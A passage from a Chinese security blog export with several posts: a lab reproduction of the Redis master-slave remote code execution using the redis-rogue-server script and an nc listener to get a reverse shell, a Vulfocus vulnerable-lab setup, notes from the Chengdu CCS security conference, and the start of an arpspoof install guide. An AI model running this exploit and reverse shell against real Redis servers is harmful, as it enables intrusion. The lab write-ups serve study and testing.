<li>详情参考：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">Pavel Toporkov</a></li>
</ul>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis &lt;= 5.0.5</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="doker搭建"><a href="#doker搭建" class="headerlink" title="doker搭建"></a>doker搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">攻击机：kali</span><br><span class="line">受害机：centos-docker</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搭建</span><br><span class="line">docker pull damonevking/redis5.0 </span><br><span class="line">docker run -p 6379:6379 -d damonevking/redis5.0 redis-server</span><br></pre></td></tr></table></figure>

<h3 id="Linux搭建"><a href="#Linux搭建" class="headerlink" title="Linux搭建"></a>Linux搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">攻击机：kali</span><br><span class="line">受害机：centos 7</span><br><span class="line">下载地址：http://download.redis.io/releases/redis-4.0.11.tar.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搭建</span></span><br><span class="line">wget http://download.redis.io/releases/redis-4.0.11.tar.gz</span><br><span class="line">tar -zvxf redis-4.0.11.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-4.0.11</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改redis.conf。开启外部访问，关闭保护模式</span></span><br><span class="line">vi redis.conf</span><br><span class="line"><span class="comment"># 修改bind 127.0.0.1为bind 0.0.0.0</span></span><br><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line"><span class="comment"># 修改protected-mode yes为protected-mode no</span></span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154018109.png" alt="image-20210829154018109"></p>
<h3 id="windows搭建"><a href="#windows搭建" class="headerlink" title="windows搭建"></a>windows搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">攻击机：kali</span><br><span class="line">受害机：windwos 7</span><br><span class="line">windows下载地址：</span><br><span class="line">https://github.com/microsoftarchive/redis/releases</span><br></pre></td></tr></table></figure>

<p>下载Redis-x64-3.2.100.zip，并解压到本地目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改配置文件redis.windows.conf ，开启远程访问，关闭保护模式。</span><br><span class="line">修改bind 127.0.0.1为bind 0.0.0.0</span><br><span class="line">修改protected-mode yes为protected-mode no</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154046374.png" alt="image-20210829154046374"></p>
<p>启动redis服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-server.exe  redis.windows.conf </span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>扫描漏洞端口</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap 192.168.40.131 -p 6379</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-12 21:34 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.40.131</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  redis</span><br><span class="line">MAC Address: 00:0C:29:10:79:D9 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.22 seconds</span><br></pre></td></tr></table></figure>

<p><strong>利用攻击脚本：</strong><a href="https://github.com/n0b0dyCN/redis-rogue-server">n0b0dyCN/redis-rogue-server</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:/opt/tools/Redis/redis-rogue-server-master# python3 redis-rogue-server.py  --rhost 192.168.40.131 --lhost 192.168.40.132 --exp=exp.so</span><br><span class="line">______         _ _      ______                         _____                          </span><br><span class="line">| ___ \       | (_)     | ___ \                       /  ___|                         </span><br><span class="line">| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ </span><br><span class="line">|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ &#x27;__\ \ / / _ \ &#x27;__|</span><br><span class="line">| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   </span><br><span class="line">\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   </span><br><span class="line">                                     __/ |                                            </span><br><span class="line">                                    |___/                                             </span><br><span class="line">@copyright n0b0dy @ r3kapig</span><br><span class="line"></span><br><span class="line">[info] TARGET 192.168.40.131:6379</span><br><span class="line">[info] SERVER 192.168.40.132:21000</span><br><span class="line">[info] Setting master...</span><br><span class="line">[info] Setting dbfilename...</span><br><span class="line">[info] Loading module...</span><br><span class="line">[info] Temerory cleaning up...</span><br><span class="line">What do u want, [i]nteractive shell or [r]everse shell: r #输入i是直接获取交互式shell</span><br><span class="line">[info] Open reverse shell...</span><br><span class="line">Reverse server address: 192.168.40.132</span><br><span class="line">Reverse server port: 2333      </span><br><span class="line">[info] Reverse shell payload sent.</span><br><span class="line">[info] Check at 192.168.40.132:2333</span><br><span class="line">[info] Unload module...</span><br><span class="line"></span><br><span class="line">root@kali:~# nc -lvvp 2333</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154322123.png" alt="image-20210829154322123"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154332910.png" alt="image-20210829154332910"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>Vulfocus 漏洞环境搭建</title>
    <url>/2021/08/29/Vulfocus%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>Vulfocus是一个漏洞集成平台，所以可以无限添加漏洞环境并且没有限制。因为漏洞环境是docker镜像，所以每次重启动漏洞环境之前的环境都会还原，不会出现因对环境造成的破坏而下一次启动环境失败的问题。</p>
<hr>
<span id="more"></span>

<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>获取docker镜像，执行命令;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/vulfocus:latest</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121137130.png" alt="image-20210829121137130"></p>
<p>查看docker镜像;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121216838.png" alt="image-20210829121216838"></p>
<p>启动docker镜像;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e VUL_IP=XXX.XXX.XXX.XXX vulfocus/vulfocus #IP必须是本机地址</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121314447.png" alt="image-20210829121314447"></p>
<p>之后，关闭防火墙；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl stop firewalld</span><br><span class="line">[root@localhost ~]# systemctl disable firewalld</span><br><span class="line">登陆用户名密码：admin/admin</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121518860.png" alt="image-20210829121518860"></p>
<p>通过以下步骤进行靶机场景搭建;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121549668.png" alt="image-20210829121549668"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>成都CCS网络安全大会</title>
    <url>/2021/10/27/%E6%88%90%E9%83%BDCCS%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A/</url>
    <content><![CDATA[<hr>
<p>秋风起，暑却未消停。蓉城的苍穹依旧云卷天舒，秋却不是四年前的秋，我记忆里的秋应该是有雨的，凉气逼得外出的人们不得不多加几件外套。今年的秋，暑意未曾停歇，火红的骄阳不舍这似水的流年。是啊，时间已悄然走过了四年，一经辗转便奔向第五个年头。</p>
<p>我单不知，人在一段不长也不短的时间里，可以经历无数次的选择，在每一个不起眼的日子里作出的每一个不起眼的决定，竟能发生在未来！舍弃文笔从业网安或许并非我意，也未曾作出从蓉城奔赴鹭岛的选择，我没有过抉择，却得到了答案。</p>
<p>于是，我在时间的海岸线上拾起了回忆的贝壳：也许是在学校的某一个不起眼的夜晚，教室里坐着有三两个同学，异口同声的说：“打进CTF线下大赛！成为远近闻名的黑客！”；也许是在每一个不起眼的课堂，老师在台上对着台下疯狂输出的同时，我在台下开着电脑冲刷着CTF的赛题……</p>
<p>彼时的我，走在蓉城的某个街头角落，踏行在眼前的路上；此时的我，站在鹭岛的码头上，看着眼前浪花地拍打。我仿佛见到了以前的自己，那个不是很努力，却又不肯轻易言弃、熟悉又陌生的身影……</p>
<hr>
<span id="more"></span>

<h1 id="打击黑灰产网络犯罪论坛"><a href="#打击黑灰产网络犯罪论坛" class="headerlink" title="打击黑灰产网络犯罪论坛"></a>打击黑灰产网络犯罪论坛</h1><p><strong>标签：黑灰产、网络诈骗、大数据分析、自动化流程处置</strong></p>
<h2 id="打击黑灰产"><a href="#打击黑灰产" class="headerlink" title="打击黑灰产"></a>打击黑灰产</h2><h3 id="全网采集（建立样本库）"><a href="#全网采集（建立样本库）" class="headerlink" title="全网采集（建立样本库）"></a>全网采集（建立样本库）</h3><ul>
<li>公开情报（<a href="https://www.virustotal.com/gui/home/upload%EF%BC%89">https://www.virustotal.com/gui/home/upload）</a></li>
<li>网络巡检</li>
<li>用户提交</li>
<li>监管合作</li>
</ul>
<h3 id="解析打标（深度解析，挖掘细节信息）"><a href="#解析打标（深度解析，挖掘细节信息）" class="headerlink" title="解析打标（深度解析，挖掘细节信息）"></a>解析打标（深度解析，挖掘细节信息）</h3><ul>
<li>静态分析</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027162451590.png" alt="image-20211027162451590"></p>
<ul>
<li>动态分析</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027163320104.png" alt="image-20211027163320104"></p>
<h3 id="聚类分析（家族类聚、团伙挖掘）"><a href="#聚类分析（家族类聚、团伙挖掘）" class="headerlink" title="聚类分析（家族类聚、团伙挖掘）"></a>聚类分析（家族类聚、团伙挖掘）</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027165123049.png" alt="image-20211027165123049"></p>
<p><strong>处置权重</strong>，哪些是常被黑灰产利用的实体app，聚类分级权重；<br><strong>助力拓线</strong>，是指可以从一个黑灰产窝点牵扯出其它的黑灰产窝点。</p>
<h3 id="溯源分析（定位）"><a href="#溯源分析（定位）" class="headerlink" title="溯源分析（定位）"></a>溯源分析（定位）</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027170401075.png" alt="image-20211027170401075"></p>
<p>​    <strong>0号病人</strong>，指的是黑灰产使用的电子设备信息（用的很廉价的、非大众化的）、支付账户（一般是抓新号，却有大量资金流动的账户）信息等。<br>​    <strong>符号特征</strong>，指url链接的筛查、邮箱和手机号等暴露在外的指纹信息。<br>​    <strong>基础设施</strong>，比如博彩的网站主机位置及费用、使用的框架、插件，通过渗透手段，拿下网站并抓取数据。<br>​    <strong>沉淀出以下（黑灰产）技战术</strong>：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027170516527.png" alt="image-20211027170516527"></p>
<h2 id="打击新型网络犯罪的实战过程"><a href="#打击新型网络犯罪的实战过程" class="headerlink" title="打击新型网络犯罪的实战过程"></a>打击新型网络犯罪的实战过程</h2><h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027170632854.png" alt="image-20211027170632854"></p>
<p>​    对黑灰产网站进行渗透测试（一般黑灰产的安全意识比较薄弱），技战术。</p>
<h3 id="新型网络犯罪手段"><a href="#新型网络犯罪手段" class="headerlink" title="新型网络犯罪手段"></a>新型网络犯罪手段</h3><ul>
<li><strong>电信诈骗</strong></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172325695.png" alt="image-20211027172325695"></p>
<ul>
<li><strong>手机木马</strong></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172350223.png" alt="image-20211027172350223"></p>
<ul>
<li><strong>杀猪盘</strong></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172402479.png" alt="image-20211027172402479"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172427492.png" alt="image-20211027172427492"></p>
<p>​    通过网站的登陆数据，判断黑灰产团伙的窝点位置。</p>
<ul>
<li><strong>理财诈骗</strong></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172514088.png" alt="image-20211027172514088"></p>
<p>​    给不同的银行账户打钱（黑灰产团伙）</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172540225.png" alt="image-20211027172540225"></p>
<p>​    可能在一个盘里，就一只猪，其它用户都是NPC。</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211027172556607.png" alt="image-20211027172556607"></p>
<h3 id="犯罪定性"><a href="#犯罪定性" class="headerlink" title="犯罪定性"></a>犯罪定性</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172629614.png" alt="image-20211027172629614"></p>
<p>​    事先取证。法庭认可此证据。<br>​    定罪。诈骗/非法经营。</p>
<h2 id="支付宝流量海关风险对抗体系"><a href="#支付宝流量海关风险对抗体系" class="headerlink" title="支付宝流量海关风险对抗体系"></a>支付宝流量海关风险对抗体系</h2><p>​    介绍支付宝是如何对流量海关的风险管控，意思就是，支付宝是怎么从每天访问量上亿的流量数据（url链接）中找到恶意链接，并及时封堵此恶意链接。</p>
<h3 id="流量海关孵化背景"><a href="#流量海关孵化背景" class="headerlink" title="流量海关孵化背景"></a>流量海关孵化背景</h3><p>​    为适配支付宝业务形态。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027173254716.png" alt="image-20211027173254716"></p>
<h3 id="支付流量海关技术架构"><a href="#支付流量海关技术架构" class="headerlink" title="支付流量海关技术架构"></a>支付流量海关技术架构</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027173337942.png" alt="image-20211027173337942"></p>
<h3 id="海关预警样例"><a href="#海关预警样例" class="headerlink" title="海关预警样例"></a>海关预警样例</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027173400293.png" alt="image-20211027173400293"></p>
<p>​    这儿有点意思，就是说，用户A支付的方式有异常，比如环境异常、设备异常、渠道异常、有作案前科的，只要满足有一条，就会自动阻止支付入口。</p>
<h1 id="数据安全能力建设论坛"><a href="#数据安全能力建设论坛" class="headerlink" title="数据安全能力建设论坛"></a>数据安全能力建设论坛</h1><p><strong>标签：数据安全、企业信息安全建设、数据感知平台、APT</strong></p>
<h2 id="内部威胁场景下的数据安全能力建设"><a href="#内部威胁场景下的数据安全能力建设" class="headerlink" title="内部威胁场景下的数据安全能力建设"></a>内部威胁场景下的数据安全能力建设</h2><h3 id="内部威胁场景案例"><a href="#内部威胁场景案例" class="headerlink" title="内部威胁场景案例"></a>内部威胁场景案例</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174409091.png" alt="image-20211027174409091"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174414052.png" alt="image-20211027174414052"></p>
<h3 id="数据安全合规"><a href="#数据安全合规" class="headerlink" title="数据安全合规"></a>数据安全合规</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174432261.png" alt="image-20211027174432261"></p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>​    基于业务流程的审计体系。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174459422.png" alt="image-20211027174459422"></p>
<p>​    简单的说：1.要按照业务流程走，对企业内部的业务使用、传输、访问等操作有流程和管理，进行整体的风险监控。2.是支持合法合规的保护，按重要、敏感等级来划分，分别实行不同的风险监控。3.是能够支持安全预警和对风险的溯源。</p>
<h2 id="数据感知体系"><a href="#数据感知体系" class="headerlink" title="数据感知体系"></a>数据感知体系</h2><h3 id="个人信息保护法"><a href="#个人信息保护法" class="headerlink" title="个人信息保护法"></a>个人信息保护法</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174741147.png" alt="image-20211027174741147"></p>
<h3 id="行业矛盾"><a href="#行业矛盾" class="headerlink" title="行业矛盾"></a>行业矛盾</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174806465.png" alt="image-20211027174806465"></p>
<p>​    总结：没人、没门、没钱、没场景，还害怕数据源的的丢失。</p>
<h3 id="设计难点"><a href="#设计难点" class="headerlink" title="设计难点"></a>设计难点</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174959442.png" alt="image-20211027174959442"></p>
<h2 id="APT事件分析"><a href="#APT事件分析" class="headerlink" title="APT事件分析"></a>APT事件分析</h2><h3 id="攻击还原过程"><a href="#攻击还原过程" class="headerlink" title="攻击还原过程"></a>攻击还原过程</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027175122125.png" alt="image-20211027175122125"></p>
<h3 id="样本扩展"><a href="#样本扩展" class="headerlink" title="样本扩展"></a>样本扩展</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027175145426.png" alt="image-20211027175145426"></p>
<h3 id="为什么是APT"><a href="#为什么是APT" class="headerlink" title="为什么是APT"></a>为什么是APT</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027175207058.png" alt="image-20211027175207058"></p>
<h3 id="APT最新活动"><a href="#APT最新活动" class="headerlink" title="APT最新活动"></a>APT最新活动</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027175232969.png" alt="image-20211027175232969"></p>
<p>​    <a href="%5Bhttps://ti.qianxin.com/apt/detail/5aa0eed8d70a3f07e3f73891?name=%E6%B5%B7%E8%8E%B2%E8%8A%B1&type=map%5D(https://ti.qianxin.com/apt/detail/5aa0eed8d70a3f07e3f73891?name=%E6%B5%B7%E8%8E%B2%E8%8A%B1&type=map)">海莲花</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027180430497.png" alt="image-20211027180430497"></p>
<h2 id="威胁情报在企业中实践应用"><a href="#威胁情报在企业中实践应用" class="headerlink" title="威胁情报在企业中实践应用"></a>威胁情报在企业中实践应用</h2><h3 id="威胁大数据分析核心问题剖析"><a href="#威胁大数据分析核心问题剖析" class="headerlink" title="威胁大数据分析核心问题剖析"></a>威胁大数据分析核心问题剖析</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028090823245.png" alt="image-20211028090823245"></p>
<p>​    分别从数据标准、采集接口、宏观看资产以及鉴权管理。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028090936831.png" alt="image-20211028090936831"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028090948741.png" alt="image-20211028090948741"></p>
<h3 id="威胁数据工作流程"><a href="#威胁数据工作流程" class="headerlink" title="威胁数据工作流程"></a>威胁数据工作流程</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028091017016.png" alt="image-20211028091017016"></p>
<h3 id="情报协同共享"><a href="#情报协同共享" class="headerlink" title="情报协同共享"></a>情报协同共享</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028091053791.png" alt="image-20211028091053791"></p>
<p>​    <strong>对一些指纹特征的识别技术</strong>，放大看，或许能抛砖引玉。</p>
<h3 id="攻击事件-溯源"><a href="#攻击事件-溯源" class="headerlink" title="攻击事件-溯源"></a>攻击事件-溯源</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028091145502.png" alt="image-20211028091145502"></p>
<h1 id="白帽技术分论坛"><a href="#白帽技术分论坛" class="headerlink" title="白帽技术分论坛"></a>白帽技术分论坛</h1><p><strong>标签：主机安全、安卓安全、漏洞运营建设</strong></p>
<h2 id="字节跳动主机安全建设分享"><a href="#字节跳动主机安全建设分享" class="headerlink" title="字节跳动主机安全建设分享"></a>字节跳动主机安全建设分享</h2><p>​    <a href="https://bytedance.feishu.cn/file/boxcnOO9zeJc5ZlWUL0siQ28W1f">点击转至PPT链接</a></p>
<h3 id="Who-is-Elkeid"><a href="#Who-is-Elkeid" class="headerlink" title="Who is Elkeid"></a>Who is Elkeid</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092022802.png" alt="image-20211028092022802"></p>
<p>​    Elkeid就是升级版的、可用于捕获APT组织的、能检测rootkot的、并且具有类似rasp的实时检测技术的HIDS。号称百万级开源 HIDS 解决方案。（<a href="https://paper.seebug.org/1566/%EF%BC%89">https://paper.seebug.org/1566/）</a></p>
<h3 id="主机威胁来源"><a href="#主机威胁来源" class="headerlink" title="主机威胁来源"></a>主机威胁来源</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092052056.png" alt="image-20211028092052056"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092052056.png"></p>
<p>​    以主机威胁来源作为切入点，并且给了开源项目的威胁数据采集（如图看，偏向底层采集）。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092146025.png" alt="image-20211028092146025"></p>
<h3 id="Elkeid-数据一览"><a href="#Elkeid-数据一览" class="headerlink" title="Elkeid 数据一览"></a>Elkeid 数据一览</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092203363.png" alt="image-20211028092203363"></p>
<p>​    看到他所分析的行为：文件行为、网络行为、进程行为、内核行为、rootkit和系统内建命令审计，并且具有日志分析功能。</p>
<p>​    <strong>采集样本数据</strong>：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092241204.png" alt="image-20211028092241204"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092245801.png" alt="image-20211028092245801"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092251114.png" alt="image-20211028092251114"></p>
<h3 id="识别威胁的第二步是什么？精准的策略"><a href="#识别威胁的第二步是什么？精准的策略" class="headerlink" title="识别威胁的第二步是什么？精准的策略"></a>识别威胁的第二步是什么？精准的策略</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092308976.png" alt="image-20211028092308976"></p>
<p>​    重点在于规则引擎和模型框架。</p>
<h3 id="如何让策略更加精准？"><a href="#如何让策略更加精准？" class="headerlink" title="如何让策略更加精准？"></a>如何让策略更加精准？</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092509312.png" alt="image-20211028092509312"></p>
<h3 id="Kill-Chain"><a href="#Kill-Chain" class="headerlink" title="Kill-Chain"></a>Kill-Chain</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092525064.png" alt="image-20211028092525064"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092528892.png" alt="image-20211028092528892"></p>
<p>​    利用杀伤链做策略精准的参照，即抓住攻击关键节点。</p>
<h3 id="识别威胁的第三步是什么？高效的溯源"><a href="#识别威胁的第三步是什么？高效的溯源" class="headerlink" title="识别威胁的第三步是什么？高效的溯源"></a>识别威胁的第三步是什么？高效的溯源</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092555328.png" alt="image-20211028092555328"></p>
<h3 id="溯源案例"><a href="#溯源案例" class="headerlink" title="溯源案例"></a>溯源案例</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092611233.png" alt="image-20211028092611233"></p>
<p>​    源IP很重要，放在溯源第一步。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092620938.png" alt="image-20211028092620938"></p>
<h3 id="Elkeid-Architecture"><a href="#Elkeid-Architecture" class="headerlink" title="Elkeid Architecture"></a>Elkeid Architecture</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092636682.png" alt="image-20211028092636682"></p>
<h3 id="安全的本质是什么？"><a href="#安全的本质是什么？" class="headerlink" title="安全的本质是什么？"></a>安全的本质是什么？</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092655724.png" alt="image-20211028092655724"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092658771.png" alt="image-20211028092658771"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092702440.png" alt="image-20211028092702440"></p>
<p>​    <strong>多注意第二点和第三点，绝非空谈（业务即安全，从业务建设安全）</strong></p>
<h2 id="全面解析安卓Intent-Bridge"><a href="#全面解析安卓Intent-Bridge" class="headerlink" title="全面解析安卓Intent Bridge"></a>全面解析安卓Intent Bridge</h2><p>​    <a href="https://bytedance.feishu.cn/file/boxcn1wl8bIFMtv9vKy8iNA7Bde">点击转至PPT链接</a></p>
<h2 id="知彼：攻击者情报"><a href="#知彼：攻击者情报" class="headerlink" title="知彼：攻击者情报"></a>知彼：攻击者情报</h2><p>​    <a href="https://bytedance.feishu.cn/file/boxcn1voMuRleY0N6jQygGXqIoV">点击转至PPT链接</a></p>
<h2 id="SRC反哺企业安全治理"><a href="#SRC反哺企业安全治理" class="headerlink" title="SRC反哺企业安全治理"></a>SRC反哺企业安全治理</h2><p>​    <a href="https://bytedance.feishu.cn/file/boxcngpt704FUxBxz8xzhHi5m9d">点击转至PPT链接</a></p>
<h2 id="字节跳动漏洞运营实践分享"><a href="#字节跳动漏洞运营实践分享" class="headerlink" title="字节跳动漏洞运营实践分享"></a>字节跳动漏洞运营实践分享</h2><p>​    <a href="https://bytedance.feishu.cn/file/boxcnUtFCQy3EwRaquwkkYgNwh1">点击转至PPT链接</a></p>
]]></content>
      <categories>
        <category>网络安全大会</category>
      </categories>
  </entry>
  <entry>
    <title>Arpspoof安装与使用</title>
    <url>/2021/10/29/Arpspoof%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>Arpspoof是dsniff的一个组件，主要用于进行arp欺骗使用。</p>
<ul>
<li>Driftnet官网：<a href="http://www.ex-parrot.com/~chris/driftnet/">http://www.ex-parrot.com/~chris/driftnet/</a></li>
<li>详情参考：<a href="https://blog.csdn.net/qq_25147521/article/details/103321755">https://blog.csdn.net/qq_25147521/article/details/103321755</a></li>
</ul>
<hr>
<span id="more"></span>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Centos7安装arpspoof"><a href="#Centos7安装arpspoof" class="headerlink" title="Centos7安装arpspoof"></a>Centos7安装arpspoof</h3><p>下面是需要的所有依赖包，yum源都有;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install libICE libsM libxmu libpcap libnet libxext libxext-devel libxt</span><br></pre></td></tr></table></figure>

<p>安装dsniff 和libnids RPM包;</p>
<p>libnids RPM包地址：<a href="http://www.rpmfind.net/linux/epel/7/x86_64/Packages/l/libnids-1.24-6.el7.x86_64.rpm">http://www.rpmfind.net/linux/epel/7/x86_64/Packages/l/libnids-1.24-6.el7.x86_64.rpm</a></p>
<p>dsniff RPM包地址：<a href="https://cbs.centos.org/kojifiles/packages/dsniff/2.4/0.17.b1.el7/x86_64/dsniff-2.4-0.17.b1.el7.x86_64.rpm">https://cbs.centos.org/kojifiles/packages/dsniff/2.4/0.17.b1.el7/x86_64/dsniff-2.4-0.17.b1.el7.x86_64.rpm</a></p>
